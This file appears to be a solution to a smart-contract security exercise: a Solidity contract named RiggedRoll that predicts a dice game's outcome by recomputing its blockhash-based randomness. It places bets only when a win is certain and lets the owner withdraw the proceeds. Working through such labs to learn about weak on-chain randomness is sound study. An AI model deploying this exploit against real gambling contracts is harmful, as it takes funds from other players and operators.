pragma solidity >=0.8.0 <0.9.0;  // Do not change the solidity version as it negatively impacts submission grading
// SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {

    DiceGame public diceGame;

    constructor(address payable diceGameAddress) {
        diceGame = DiceGame(diceGameAddress);
    }

    // Enable the contract to receive incoming Ether
    receive() external payable {}

    // Rigged roll function to predict the outcome
    function riggedRoll() public {
        require(address(this).balance >= 0.002 ether, "Insufficient balance for roll");

        // Predict the randomness in the same way as DiceGame
        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), diceGame.nonce()));
        uint256 nextRoll = uint256(hash) % 16;

        // Check if the predicted roll is a winning number
        if (nextRoll <= 5) {
            diceGame.rollTheDice{value: 0.002 ether}();
        }
    }

    // Withdraw function to transfer Ether to a specified address
    function withdraw(address payable _to, uint256 _amount) public onlyOwner {
        require(address(this).balance >= _amount, "Insufficient balance to withdraw");
        _to.transfer(_amount);
    }
}
